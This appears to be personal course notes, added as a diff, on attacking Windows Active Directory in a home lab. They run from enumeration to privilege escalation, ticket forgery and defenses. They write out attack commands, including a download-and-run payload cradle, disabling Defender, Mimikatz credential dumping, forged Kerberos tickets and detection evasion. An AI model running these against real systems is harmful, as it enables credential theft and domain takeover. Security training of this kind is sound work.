@@ -1,0 +1,780 @@
+MORE-AD-NOTES
+Windows Red Team Lab (video notes)
+Lesson 1 Basics:
+
+Active Directory:
+- Directory Service used to managed Windows networks
+- stores information about objects on the network and makes it easily available to users and domains
+- Active Directory enabled centralized, secure management of an entire network, which might span a building, a city or multiple locations
+- Schema - defines objects and their attributes
+- query and index mechanism - provides searching and publication of objects and their properties
+- Global Catalog - contains information about every object in the directory
+- Replication Service - distributes information across domain controllers
+- Forest, domains and organizational unites (OUs) are the basic building blocks of any active directory structure.
+    - a forest is a security boundary - may contain multiple domains and each domain may contain multiple OUs.
+
+PowerShell:
+- provides access to almost everything in a Windows platform and AD environment which could be useful for an attacker
+- provides the capability of running powerful scripts completely from memory making it ideal for foothold shells/boxes
+- easy to learn and really powerful
+- based on .NET framework and is tightly integrated with Windows
+- PowerShell Core is platform independent
+
+Open up Windows PowerShell ISE as an Administrator:
+
+See file with powershell commands...
+
+Cmdlets are used to perform an action and a .Net obkect is returned as the output
+Cmdlets accept parameters for different operations
+They have aliases.
+These are NOT executables, you can write your own cmdlet with few lines of script.
+
+Examples:
+cd C:\
+dir:    //this works
+dir.exe:    //this does not
+
+Important!
+Use the below command for listing all cmdlets:
+get-command -commandtype cmdlet
+
+There are many interesting cmdlets from a pentester's perspective.
+For example:
+get-process
+, list processes running on a system.
+
+get-command -Name *process*
+get-command -Verb set
+
+It is a GUI Editor/Scripting Environment.
+Tab Completion, context-sensitive help, syntax highlighting, selective execution, in-line help are some of the useful features.
+Comes with a handy console pane to run commands from the ISE.
+
+Execution Policy:
+- this is NOT a security measure, but it is a prevention measure to prevent a user from accidently executing scripts
+- several ways to bypass:
+powershell -executionbypass bypass .\script.ps1
+powershell -c <cmd>
+powershell -enc
+
+Turn off the Windows Defender:
+Set-MpPreference -disablerealtimeMonitoring $true
+
+.\Invoke-Encode.ps1
+Get-ExecutionPolicy
+powershell -ep bypass
+Powershell.exe -ExecutionPolicy bypass -File C:\Users\win10\Downloads\nishang-master\Utility\Invoke-Encode.ps1
+
+- Powershell also supports modules.
+- A module can be imported with:
+Import-module <path to module>
+
+- all the commands in a module can be listed with:
+Get-Command -Module <modulename>
+Get-Command -module Get-ScheduledTask
+Get-command -module
+
+################
+. c:\AD\Tools\Invoke-Encode.ps1
+- the '.' in front of the path (Above) is called dot sourcing.
+################
+
+Whenever there is a command execution opportunity, PowerShell scripts can be executed using following methods:
+- Download execute cradle
+iex(New-Object net.webclient).DownloadString('https://webserver/payload.ps1')
+- Encodedcommand
+>help powershell.exe    //to find out powershell.exe available commands!
+
+CheckOut Invoke-CradleCrafter:
+http://github.com/danielbohannon/Invoke-CradleCrafter
+
+#####################
+Lesson 2 Domain Enumeration:
+
+PowerShell and AD:
+- [ADSI]
+- .Net Classes
+- Native Executables
+- PowerShell (.NET classes or WMI or Active Directory Module)
+
+Let's start wirh Domain Enumeration and map various entities, trusts, relationships and privileges of the target domain.
+We will use open source tools, such as PowerView, for domain enumeration.
+
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+
+We will also use Microsoft Active Directory module:
+https://docs.microsoft.com/en-us/powershell/module/addsadministration/
+
+After spending some time to install PowerView and the Install-ActiveDirectoryModule.ps1, we can finally start doing some domain enumeration!
+
+PS C:\users\win10\Downloads> powershell.exe -executionpolicy unrestricted
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\users\win10\Downloads> .\Install-ActiveDirectoryModule.ps1
+
+NAME
+    Install-ADModule
+
+SYNOPSIS
+    Installs the AD PowerShell module from RSAT for Windows 10
+(partial copy above)
+
+- Get the current domain(PowerView)
+Get-NetDomain
+Get-NetDomain -Domain lethallab.local
+
+- Get the current domain SID:
+Get-DomainSID
+
+- Using Active Directory module:
+Get-ADDomain
+Get-ADDomain -Identity lethallab.local
+(Get-ADDomain).DomainSID.Value
+
+
+Let's setup the environment!
+You should make sure you have a good working Domain Controller, as all the information is being pulled from a Domain Controller.
+
+
+PS C:\Users\win10\Downloads\PowerSploit-master\Recon> Import-Module .\PowerView.ps1
+PS C:\users\win10\Downloads\PowerSploit-master\recon> get-command -module recon
+PS C:\users\win10\Downloads\PowerSploit-master\recon> get-netdomain
+
+PS C:\Users\win10\Downloads\PowerSploit-master\Recon> get-netdomain -domain lethallab.local
+
+
+Forest                  : lethallab.local
+DomainControllers       : {Win2008SRV.lethallab.local, WIN2016SRV.lethallab.local}
+Children                : {}
+DomainMode              : Windows2003Domain
+DomainModeLevel         : 2
+Parent                  :
+PdcRoleOwner            : Win2008SRV.lethallab.local
+RidRoleOwner            : Win2008SRV.lethallab.local
+InfrastructureRoleOwner : Win2008SRV.lethallab.local
+Name                    : lethallab.local
+
+-Get Domain Controllers for a domain:
+PS C:\Users\win10\Downloads> Get-NetDomainController
+PS C:\Users\win10\Downloads> Get-NetDomainController -domain lethallab.local
+
+- Using Active Directory module:
+Get-ADDomainController
+Get-ADDomainController -Discover -DomainName lethallab.local
+
+- Get users of a domain:
+Get-NetUser
+get-netuser | select name
+Get-NetUser -Domain lethallab.local
+Get-NetUser -UserName win10
+
+-Using ActiveDirectory module:
+Get-ADUser -Filter * -Properties *
+Get-ADUser -Server ps-dc.lethallab.local
+Get-ADUser -Identity win10
+
+-Get all the groups in the current domain:
+Get-NetGroup
+Get-NetGroup *admin*
+
+- Using Active Directory Module:
+Get-ADGroup -Filter * | select Name
+Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
+get-adgroup -filter {Name -like "*admin*"} |select name
+
+- Get all the members of the Domain Admins group:
+Get-NetGroupMember -GroupName "Domain Admins"
+
+- Get ActiveDirectory Module
+Get-ADGroupMember -Identity "Domain Admins" -Recursive
+
+- Get the group membership of a user:
+Get-NetGroup -UserName "labuser"
+
+- Using ActiveDirectory Module:
+Get-ADPrincipalGroupMembership -Identity labuser
+
+- Get all computers of the domain:
+Get-NetComputer
+Get-NetComputer -FullData
+
+- Using ActiveDirectory Module:
+Get-ADComputer -Filter * | select Name
+Get-ADComputer -Filter * -Properties *
+
+Note to self: You should keep in mind and consider that the information is pulled from the information your Domain Controller has, and it's not an indication that the physical computer still exists. Most companies keep obsolete information in Active Directory, because they never go through an Active Directory maintenance and cleanup. In either case, the information can still be useful in your exploitation attempts!
+
+- Find all machines on the current domain where the current user has local admin access:
+Find-LocalAdminAccess -verbose
+
+- Find local admins on all machines of the domain:
+Invoke-EnumerateLocalAdmin -verbose
+
+- List Sessions on a particular computer:
+Get-NetSession -ComputerName ops-dc
+
+Note: Domain Administrator is a very sought after target, but DO NOT go after the Domain Admin (DA) blindly! Make sure getting the DA account is the goal/purpose of the engagement!
+
+- Find computers where a domain admin is logged in and current user has access:
+Invoke-UserHunter -CheckAccess -Verbose
+
+- Above gets a list of machines from DC and list sessions and logged on users_from_each machine! This is not easy to find, but it's still a useful command to run!
+
+
+Hands-On number 1:
+- Enumerate the following for the current domain:
+Users, Computers, Domain Administrators, Shares, Sessions on the Domain Controller.
+
+Demonstration: Block user hunting(session enumeration) on the Domain Controller!!!!!!
+- we can use a script called NetCease.ps1 that strips such permissions from a box.
+
+######
+Domain Enumeration - ACL:
+You can find ACLS in Active Directory under a user (for example), Security tab, Advanced, and the Permissions tab.
+
+- Get the ACLs associated with the specified object:
+Get-ObjectACL -SamAccountName win10 -ResolveGUIs
+
+- Get the ACLs associated with the specified prefix to be used for search:
+Get-ObjectACL -ADSprefix 'CN=Administrator, CN=Users' -Verbose
+
+- We can also enumerate ACLs using Active Directory Module but without resolving GUIDs:
+(Get-ACL 'AD:\CN=win10, CN=Users, DC=win2008srv, DC=lethallab, DC=local').Access
+
+- To look for interesting ACEs:
+Invoke-ACLScanner -ResolveGUIDs
+
+
+Hands-On number 2:
+- Enumerate following for the current domain:
+Check if win10 user has Write/Modify permissions on any objects!
+
+
+##############
+Domain Enumeration - Trusts:
+- Get a list of all domain trusts for the current domain, if you have any, but it's possible that in your home lab network, you will not have any, since you only have one forest or (if any) child domain:
+Get-NetDomainTrust                        //don't worry if you don't have any in your lab domain
+Get-NetDomainTrust -Domain redps.offensiveps.lethallab.local    //this would be a child domain of the lethallab.local domain
+
+- Using Active Directory Module:
+Get-ADTrust -Filter *
+Get-ADTrust -Identity redps.offensiveps.lethallab.local
+
+- Get details about the current forest:
+Get-NetForest
+Get-NetForest -Forest lethallab.local
+
+- Using Active Directory Module:
+Get-ADForest
+Get-ADForest -Identity lethallab.local
+
+- Get all domains in the current forest:
+Get-NetForestDomain
+Get-NetForestDomain -Forest lethallab.local
+
+- Using ActiveDirectory Module:
+(Get-ADForest).Domains
+
+- Get trusts in the forest (if you have a forest trust in your lab and if you don't, then don't expect an output):
+Get-NetForestTrust
+Get-NetForestTrust -Forest lethallab.local
+
+- Using ActiveDirectory Module:
+Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
+
+Hands-On number 3:
+Enumerate all the trusts - domain trusts, external trusts and others for the current forest.
+
+#####################
+Lesson 3 Local Privilege Escalation:
+
+- up to now, we have only done a lot of enumeration!
+
+In an AD environment, there are multiple scenarios which lead to privilege escalation. We had a look for the following:
+- Hunting for Local Admin access on other machines
+- Hunting for high privilege domain account (like a Domain Admin)
+There are various ways to privilege escalate on Windows boxes:
+- Missing patches
+- Automated deployment and AutoLogon passwords in clear text
+- AlwaysInstallElevated (any user can run MSI on SYSTEM)
+- Misconfigured Services
+- DLL HiJacking
+- Token Manipulation or Impersonation
+
+PowerUp:
+- Let's use PowerUp from PowerSploit for local privilege escalation by abusing services.
+- Get Services with unquotes paths and a space in their name or executable path:
+Get-ServiceUnquotes -Verbose
+
+ex:
+Get-WmiObject win32_service | fl *
+
+For instance if in the path c:\ftpserver\ftp server\myftp\ftp.exe , the c:\ftpserver\ftp server\myftp\ftp.exe is unquoted, an attacker can drop an ftp.exe, and as soon as the user, right the right permissions, run the program, we can privilege escalate. That's why it's called the unquoted path vulnerability! For this to NOT work, the path would have to be in quotes, like this:
+"c:\ftpserver\ftp server\myftp\ftp.exe" .
+
+- Get Services where the current user can write to its binary path:
+Get-ModifiableServiceFile -Verbose
+
+- Get the Services which current user can modify:
+Get-ModifiableService -Verbose
+
+- Run all Checks:
+Invoke-AllChecks
+
+Example:
+PS C:\Users\win10\Downloads\PowerSploit-master> cd .\Privesc\
+PS C:\Users\win10\Downloads\PowerSploit-master\Privesc> ls
+    Directory: C:\Users\win10\Downloads\PowerSploit-master\Privesc
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         9/2/2018  11:55 PM          26485 Get-System.ps1
+-a----         9/2/2018  11:55 PM         562841 PowerUp.ps1
+-a----         9/2/2018  11:55 PM           1564 Privesc.psd1
+-a----         9/2/2018  11:55 PM             67 Privesc.psm1
+-a----         9/2/2018  11:55 PM           4297 README.md
+
+PS C:\Users\win10\Downloads\PowerSploit-master\Privesc> Import-Module .\PowerUp.ps1
+PS C:\Users\win10\Downloads\PowerSploit-master\Privesc> Invoke-AllChecks
+[*] Running Invoke-AllChecks
+[*] Checking if user is in a local group with administrative privileges...
+[+] User is in a local group that grants administrative privileges!
+[+] Run a BypassUAC attack to elevate privileges to admin.
+[*] Checking for unquoted service paths...
+[*] Checking service executable and argument permissions...
+ServiceName                     : ISSUSER
+Path                            : "C:\Program Files\LANDesk\LDClient\issuser.exe" /SERVICE
+ModifiableFile                  : C:\
+ModifiableFilePermissions       : AppendData/AddSubdirectory
+ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
+StartName                       : LocalSystem                        <----- with LOCALSYSTEM!!!!!!!
+AbuseFunction                   : Install-ServiceBinary -Name 'ISSUSER'
+CanRestart                      : False                        <------- we need to wait for the machine to be rebooted
+
+ServiceName                     : ISSUSER
+Path                            : "C:\Program Files\LANDesk\LDClient\issuser.exe" /SERVICE
+ModifiableFile                  : C:\
+ModifiableFilePermissions       : {Delete, GenericWrite, GenericExecute, GenericRead}
+ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'ISSUSER'
+CanRestart                      : False
+
+[*] Checking service permissions...
+[*] Checking %PATH% for potentially hijackable DLL locations...
+
+ModifiablePath    : C:\Users\win10\AppData\Local\Microsoft\WindowsApps
+IdentityReference : LETHALLAB\win10
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\win10\AppData\Local\Microsoft\WindowsApps
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\win10\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+[*] Checking for AlwaysInstallElevated registry key...
+[*] Checking for Autologon credentials in registry...
+[*] Checking for modifidable registry autoruns and configs...
+[*] Checking for modifiable schtask files/configs...
+[*] Checking for unattended install files...
+[*] Checking for encrypted web.config strings...
+[*] Checking for encrypted application pool and virtual directory passwords...
+[*] Checking for plaintext passwords in McAfee SiteList.xml files....
+[*] Checking for cached Group Policy Preferences .xml files....
+
+PS C:\Users\win10\Downloads\PowerSploit-master\Privesc>
+
+##########
+PS C:\Users\win10\Downloads\PowerSploit-master\Privesc> Invoke-ServiceAbuse
+
+PS C:\Users\win10\Downloads\PowerSploit-master\Privesc> Invoke-ServiceAbuse -examples
+
+PS C:\Users\win10\Downloads\PowerSploit-master\Privesc> Invoke-ServiceAbuse -Name AbyssWebServer -UserName 'lethallab\wi
+n10'
+
+- the last Invoke-ServiceAbuse command, will add the current user: win10 to the local Administrators group. We had to read the Invoke-ServiceAbuse with the -examples parameter, so that we can learn how to run the command properly. We will need to logoff from the account and log on, so that the new permissions take effect!
+
+And now with Admin privileges we can run the command below to disable AV protection:
+>Set-MpPreference -DisableRealtimeMonitoring $true
+
+Hands-On number 4:
+Exploit a service on your lab VM and elevate privileges to local administrator!
+
+#####################
+Lesson 4 Lateral Movement Protocols and tools:
+
+PowerShell Remoting
+Think of it as psexec on steroids.
+You will find this increasingly used in enterprises. Enabled by default on Server 2012 onwards!
+You may need to enable remoting (Enable-PSRemoting) on a Desktop Windows machines, Admin privs are required to do that.
+You get elevated shell on remote system if admin creds are used to authenticate (which is the default setting).
+
+One-on-One
+PSSession:
+- Interactive
+- Runs in a new process (wsmprovhost)
+- Is Stateful
+Useful cmdlets:
+- New-PSSession
+- Enter-PSSession
+
+Example:
+PS C:\Users\Administrator.WIN2008SRV> new-pssession -ComputerName win2016srv
+
+ Id Name            ComputerName    State    ConfigurationName     Availability
+ -- ----            ------------    -----    -----------------     ------------
+  1 Session1        win2016srv      Opened   Microsoft.PowerShell     Available
+
+PS C:\Users\Administrator.WIN2008SRV> $sess = New-PSSession -computername win2016sr
+PS C:\Users\Administrator.WIN2008SRV> Enter-PSSession -session $sess
+[win2016srv]: PS C:\Users\administrator\Documents> hostname
+WIN2016SRV
+
+PowerShell Remoting:
+- One-to-Many
+- Also Known as Fan-Out remoting
+- non-interactive
+- executes commands parallely
+- useful cmdlets
+    - Invoke-Command
+- Invoke-Command
+- Run commands and scripts on:
+    - multiple remote computers
+    - in disconnected session (v3)
+    - as background job and more.
+- the best thing in PowerShell for passing the hashes, using credentials and executing commands on multiple remote computers.
+- Use-Credential parameter to pass username/password.
+- use below to execute commands or semicolon separated scripts:
+Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list of servers>)
+
+example:
+Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName win2016srv
+PS C:\Users\Administrator.WIN2008SRV> Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName win2016srv
+lethallab\administrator
+WIN2016SRV
+
+Invoke-Command -ScriptBlock{$who = whoami} -ComputerName win2016srv
+Invoke-Command -ScriptBlock{$who} -ComputerName win2016srv
+
+- use below command to execute scripts from files:
+Invoke-Command -FilePath c:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list of servers>)
+
+ex:
+Invoke-Command -FilePath c:\AD\Tools\Invoke-Encode.ps1 -ComputerName Win2016srv
+
+powershell.exe -ep bypass
+. c:\AD\Tools\Invoke-Mimikatz.ps1
+Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName win2016srv
+
+- Use below to execute "Stateful" commands:
+$Sess = New-PSSession -ComputerName Server1
+Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
+Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
+
+$sess = New-PSSession -computername win2016sr
+Invoke-Command -ScriptBlock{$who = whoami} -Session $sess
+Invoke-Command -ScriptBlock{$who} -Session $sess
+
+Invoke-Mimikatz:
+- the script could be used to dump credentials, tickets and more using mimikatz with PowerShell without dropping the exe to the disk.
+- it is useful for passing and replaying hashes, tickets and for many exciting Active Directory attacks
+- using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be useful from this script!
+
+- mimikatz is still being detected, but we can still use it with downloaded cradle, or everywhere where we can execute commands or powershell.
+
+- Dump Credentials on a local machine:
+Invoke-Mimikatz -DumpCreds
+
+- Dump certs on a local machine:
+Invoke-Mimikatz -DumpCerts
+
+- Dump Credentials on multiple remote machines:
+Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
+
+- Invoke-Mimikatz uses PowerShell remoting cmdlet Invoke-Command to run the above command. Thus, credentials or administrative access to the remote computers is required!
+
+- "Over-pass-the-hash" generate tokens from hashes:
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:. /ntlm:<ntlmhash> /run:powershell.exe"'
+(we can run any command instead of the powershell.exe)
+
+Token Manipulation:
+- it is possible to use/impersonate tokens available on a machine
+- often tokens are available on machines due to interactive logons, accessing resources, running processes, SSO applications, etc.
+- can we use Invoke-TokenManipulation from PowerSploit or Incognito for token impersonation
+- administrative privileges are required to adjust token privileges.
+
+- List all the tokens on a machine:
+Invoke-TokenManipulation -ShowAll
+
+- List all unique, usable tokens on a machine:
+Invoke-TokenManipulation -Enumerate
+
+- Start a new process with token from a specific user:
+Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"
+
+- Start news process with token of another process:
+Invoke-TokenManipulation -CreateProcess "C:\Windows\System32\WindowsPowerShell\v1.0\Powershell.exe" -ProcessID 500
+
+#############################
+Video 5 Domain Privilege Escalation:
+
+NOTE: some information below might not be accurate, because I didn't have a trust domain configured in my home lab; so treat it with a grain of salt, but know that the commands are accurate and the only thing you should worry about is the domains in the command.
+
+Read up on Kerberos authentication and how the client computer contacts the KDC/DC server, to receive the TGT/TGS so that it can access an application server and also how every step, it's abusable!
+
+Kerberoast:
+- offline cracking of service account passwords
+- the Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of the service account. This makes it possible to request a ticket and do offline brute-forcing.
+- service accounts are many times ignored (passwords are rarely changed) and have Domain Admin privilege access.
+- password hashes of service accounts could be used to create Silver tickets.
+- presented by Tim Medin at DerbyCon 2014.
+
+
+We are after the TGT encrypted ticket with krbtgt hash when requesting a TGS ticket (TGS-REQ).
+TGS encrypted using target service's NTLM hash (TGS-REP).
+We can request a TGS from any service and the KDC will respond with a TGT ticket.
+
+- Find Service Accounts:
+GetUserSPNs
+https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
+
+- PowerView:
+Get-NetUser -SPN
+
+Note: for the above command, you should know which user accounts are domain admins!
+
+- Active Directory module (to find krbtgt and priv service accounts)
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+- Request a ticket:
+Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQL/win2016srv.lethallab.local:SQLEXPRESS"
+
+- Request a ticket using PowerView:
+Request-SPNTicket
+
+- Check if the ticket has been granted:
+klist.exe
+
+- Export all tickets using Mimikatz:
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+ls
+
+Crack the Service account password:
+python.exe .\tgsrepcrack.py .\passwords.txt '.\2-40a10000-labuser@MSSQLvc~ops-win2016srv.lethallab.local~SQLEXPRESS-lethallab.local.kirbi'
+
+Kerberos Delegation:
+- Kerberos Delegation allows the "to reuse the end-user credentials to access resources hosted on a different server". Like an application server or database server. This is generally used where Kerberos Double Hop is required.
+- Impersonating the incoming/authenticating user is necessary for any kind of Kerberos delegation to work.
+- Kerberos delegation is of two types:
+    - Unconstrained (only option till Server 2003)
+    - Constrained
+
+How does Kerberos Delegation work:
+- a user provides credentials to the Domain Controller
+- the DC returns a TGT
+- the user requests a TGS for the web service on Web Server
+- The DC provides a TGS.
+- the user sends the TGT and TGS to the web server.
+- the web server service account uses the user's TGT to request a TGS for the database server from the DC.
+- the web server service account connects to the database server as the user.
+
+Unconstrained Delegation:
+When set for a particular service account, Unconstrained delegation allows delegation to any service on that particular machine.
+The service account can then request access to any service in the domain by impersonating the incoming user (because the DC placed the user's TGT inside the TGS in step 4). In our example, the web server service account can request access to any service in the domain as the user connecting to it.
+This could be used to escalate privileges in case we can compromise such a machine and a Domain Admin (or other high privilege user) connects to that machine.
+
+- Discover domain computers which have unconstrained delegation enabled using PowerView:
+Get-NetComputer -UnConstrained
+
+- Using Active Directory Module:
+Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+Get-ADUser -Filter {TrustedForDelegation -eq $True}
+
+- We need to compromise the server where Unconstrained Delegation is enabled and wait for or trick a high privilege user to connect to the box. Once such a user is connected, we can export all the tickets, including the TGT of that user using the following command:
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+
+Note: we need administrator rights on the server, where Unconstrained Delegation is enabled!
+
+- the ticket can be reused:
+Invoke-Mimikatz -Command '"kerberos::ptt c:\tickets\admin.kirbi"'
+
+
+Constrained Delegation:
+- Introduced in Server 2008
+- as the name suggests, constrained delegation allows access only to specified services on specific computers!
+- a typical abusable scenario is when a student authenticates using a non-kerberos authentication and Protocol Transition is used by Kerberos to support a single sign on.
+- Couple of Kerberos extensions come into play for Protocol Transition but we are not going to discuss them.
+- The service account must have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION-T2A4D  UserAccountControl attribute.
+- the service account can access all the services specified in its msDS-AllowedToDelegateTo attribute.
+- another interesting issue is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified.
+
+- Enumerate users and computers with constrained delegation enabled.
+
+- Using PowerView (dev):
+.\PowerView-Dev.ps1
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+
+- Using Active Directory Module:
+Get-AdObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+
+- we need to get clear text password or the NTLM hash of the service account. It can then be used with Kekeo:
+https://github.com/gentilkiwi/kekeo/
+
+.\asktgt.exe /user:termadmin /domain:lethallab.local /key:abf05c4e729e45781acd30ed80674b1c /ticket:termadmin.kirbi
+
+- Now, using s4u from Kekeo, request a TGS:
+\s4u.exe /tgt:termadmin.kirbi /user:administrator@lethallab.local /service:cifs/ops-sqlsrvone.lethallab.local
+
+
+- Use the TGS:
+Invoke-Mimikatz -command '"kerberos:Ptt cifs.ops-sqlsrvone.lethallab.local.kirbi"'
+
+ls \\ops-sqlsrvone.lethallab.local\C$
+
+- recall that the delegation is not restricted by SPN, it is possible to create alternate tickets. Exploit it :)
+
+############################
+Video 6 Persistence Techniques:
+
+- there are many, but we will only mention 2 of them and these 2 are really useful
+- A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
+- since user account validation is not done by the Domain Controller (KDC service) until TGT is older than 20 minutes, we can use even deleted/revoked accounts.
+- the krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
+- single password change has no effect on this ticket.
+
+- Execute mimikatz on DC:
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName win2016srv
+
+- On Any Machine:
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:lethallab.local /sid:s-1-5-21-32-70384115-3177237293-604223749 /krbtgt:5c1a7d30a872cac2b732e7857589d97 /id:500 /groups:513 /ptt"'
+
+- To use the DCSync feature for getting krbtgt hash execute the following command with DA privileges for ops domain:
+Invoke-Mimikatz -Command '"lsadump:dcsync /user:ops\krbtgt'"
+
+- A valid TGS (Golden ticket is TGT).
+- Encrypted and Signed by the NTLM hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.
+- Services rarely check PAC (Privileged Attribute Certificate).
+- Services will allow access only to the services themselves.
+
+- For example, using hash of the Domain Controller computer account, the below command provides access to shares on the DC:
+Invoke-Mimikatz -Command '"kerberos::golden /domain:lethallab.local /sid:s-1-5-21-3270384115-3177237293-604223748 /target:win2008srv.lethallab.local /service:cifs /rc4:536752aef9acef8ad3b089a281830b1 /id:500 /user:Administrator /ptt"'
+
+#######################
+Video 7 Privilege Escalation Across Trusts and Domains:
+
+Child to Forest Root:
+- Domains in the same forest have an implicit two-way trust with the forest root
+- There is a trust key between the parent and child domains.
+- There are two ways of escalating privileges between two domains of the same forest:
+    - krbtgt hash
+    - Tryst tickets
+
+Look up Child to Parent Trust Flow and read up on it!
+
+Child to Forest Root using Trust Tickets:
+- So what is required to forge trust tickets is, obviously, the trust key:
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+
+- An inter-realm TGT can be forged:
+Invoke-Mimikatz -Command '"Kerberos::golden /domain:win2008srv.lethallab.local /sid:s-1-5-21-133038098-372414864-1077246548 /sids:s-1-5-21-3270384115-3177237393-604224748-519 /rc4:f43d2a6daf7641d745fb225be755d8110 /user:Administrator /service:krbtgt /target:powershell.local /ticket:c:\users\Administrator\Desktop\trust_tkt.kirbi"'
+
+- Use the TGS to access the targeted service:
+.\kirbikator.exe lsa .\CIFS.ps-dc.powershell.local.kirbi ls \\ps-dc.powershell.local\C$
+
+- Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket:
+.\asktgs.exe c:\users\administrator\Desktop\trust_tkt.kirbi CIFS/ps-dc.powershell.local
+
+- Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well.
+
+Child to Forest Root using krbtgt hash:
+- SID history once again:
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:offensiveps.powershell.local /sid:s-1-5-21-2969453985-3470385542-739374646 /krbtgt:a9d1cf9d08b6701bca220079b1557506 /sids:s-1-5-21-257853-8781-2508153159-3419410681-519 /ticket:krb_tkt.kirbi"'
+
+- On a machine of offensivepc domain:
+Invoke-Mimikatz -Command '"kerberos::pt c:\test\krb_tkt.kirbi"'
+
+- We now have Enterprise Admin Privileges:
+ls //ps-dc.powershell.local/C$
+
+#######################
+Video 8 Detection and Defense:
+
+- Do not allow or limit login of DAs to any other machine other than the Domain Controller. If logins to some server is necessary, do not allow other administrators to login to that machine!
+- Do NOT run services with DA account. Many good credential reuse defenses are rendered useless because of it.
+
+Some Important Event ID:
+-Event ID:
+    - 4624: Account Logon
+    - 4634: Admin Logoff
+    - 4672: Admin Logon
+
+Detection and Defense against Kerberoast:
+Events:
+- Security Event ID 4769 - A Kerberos ticket was requested
+
+Migitation:
+- Service Account Passwords should be hard to guess (greater than 25 characters)
+- Use Managed Service Accounts (Automatic change of password periodically and delegated SPN Management)
+https://technet.microsoft.com/en-us/library/jj128431(v=ws.11).aspx
+
+SID filtering:
+- avoid attacks which abuse SID history attribute (child to root domain privilege escalation, that is, DA from a Child to EA on forest root).
+- enabled by default on all inter-forest trusts. Intra-Forest trusts are assumed secured by default (Microsoft considers forest and not the domain to be a security boundary).
+- But, since SID filtering has potential to break applications and user access, it is often disabled.
+
+Selective Authentication:
+- in an inter-forest trust, if Selective Authentication is configured, users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given.
+
+Microsoft ATA (Advanced Threat Analytics):
+- traffic destined for Domain Controller(s) is mirrored to ATA sensors and a user activity profile is build over time - use of computers, credentials, log on machines, etc.
+- Collect Event 4776 (The DC attempted to validate the credentials for an account) to detect credential replay attacks.
+- Can DETECT behavior anomalies!   
+- Useful for detecting:
+    - Recon: account enumeration, Netsession enumeration
+    - Compromised Credentials Attacks: Brute force, high privilege account/service account exposed in clear text, Honey token,       unusual protocol (NTLM and Kerberos)
+    - Credential/Hash/Ticket Replay attacks.
+
+Bypassing ATA:
+- ATA, for all its goodness, can be bypassed and avoided
+- The key is avoid talking to the DC as long as possible and make appear the traffic we generate as attacker normal!
+
+Architectural Changes:
+LAPS(Local Administrator Password Solution):
+- Centralized storage of passwords in AD with periodic randomizing where read permissions can be access controlled
+- Storage in clear text, transmission is encrypted
+- LAPS into: https://technet.microsoft.com/en-us/mt227395.aspx
+- Abusing LAPS feature:
+https://blog.netspi.com/running-laps-around-cleartext-passwords/
+
+Privileged Administrative Workstations (PAWs):
+- a hardened workstation for performing sensitive tasks like administration of domain controllers, cloud infrastructure, sensitive business functions, etc.
+- can provide protection from phishing attacks, OS vulnerabilities, credential replay attacks.
+
+Privileged Administrative Workstations (PAWs):
+Multiple strategies:
+- Separate privilege and hardware for administrative and normal tasks
+- Admin Jump servers to be accessed only from a PAW
+- Having a VM on a PAW for user tasks
+
+Active Directory Administrative Tier Model
+Composed of three levels only for administrative accounts:
+- Tier 0 - Accounts, Groups, and computers which have privileges across the enterprise like domain controllers, domain admins, enterprise admins.
+- Tier 1 - Accounts, Groups and Computers which have access to resources having significant amount of business value. A common example role is server administrators who maintain these operating systems with the ability to impact all enterprise services.
+- Tier 2 - Administrator accounts which have administrative control of significant amount of business value that is hosted on user workstations and devices. Examples, include Help Desk and computer support administrators because they can impact the integrity of almost any user data.
+
+So we are implementing: Control Restrictions, Logon Restrictions (and Directional from Tier 2, to Tier 1, to Tier 0).
+
+ESAE (Enhanced Security Admin Environment):
